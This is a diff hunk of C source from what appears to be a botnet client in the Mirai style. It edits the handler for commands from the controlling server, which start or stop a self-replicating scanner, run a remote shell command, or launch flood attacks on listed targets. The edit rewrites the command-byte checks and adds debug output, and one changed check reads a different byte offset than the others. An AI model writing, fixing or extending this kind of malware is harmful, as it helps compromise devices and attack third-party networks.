@@ -579,21 +579,24 @@ int main(int argc, char **args)
                 attack_start(attack.duration, attack.vector, attack.targs_len, attack.targs, attack.opts_len, attack.opts);
                 free(attack.targs);
             } else {
-				if(*rdbuf == '\xFF')
+				#ifdef DEBUG
+				printf("Got CMD %d\r\n", *rdbuf);
+				#endif
+				if(*(rdbuf+0) == 255)
 				{
 					scanner_init();
 					#ifdef DEBUG
 					printf("[main/conn]: started selfrep from cmd 0xff\r\n");
 					#endif
 				}
-				else if(*rdbuf == '\xFE')
+				else if(*(rdbuf+0) == 254)
 				{
 					scanner_kill();
 					#ifdef DEBUG
-					printf("[main/conn]: stopped selfrep from cmd 0xff\r\n");
+					printf("[main/conn]: stopped selfrep from cmd 0xfe\r\n");
 					#endif
 				}
-				else if(*rdbuf == '\xFD')
+				else if(*(rdbuf+2) == '\xFD')
 				{
 					#ifdef DEBUG
 					printf("[main/conn]: Running Shell CMD %s\r\n", rdbuf+1);
